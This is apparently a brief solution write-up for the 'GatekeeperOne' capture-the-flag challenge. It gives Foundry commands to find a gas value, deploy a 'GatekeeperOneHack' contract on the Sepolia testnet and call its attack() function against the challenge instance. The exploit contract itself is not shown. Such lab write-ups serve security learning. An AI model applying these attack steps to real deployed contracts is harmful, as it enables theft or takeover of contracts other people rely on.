# GatekeeperOne Solution

1) Uncomment line 16 in `test/GatekeeperOneTest` and add the `instanceAddress`, then comment out line 15. Retrieve the `gas`:

```
forge test --mt test_gateTwo --rpc-url $SEPOLIA_RPC_URL -vvv
```

2) Deploy `GatekeeperOneHack`:

```
forge create GatekeeperOneHack --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```

3) Call `attack()`:

```
cast send `gatekeeperOneHackAddress` "attack(address,uint256)" `ìnstanceAddress` `gas` --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```
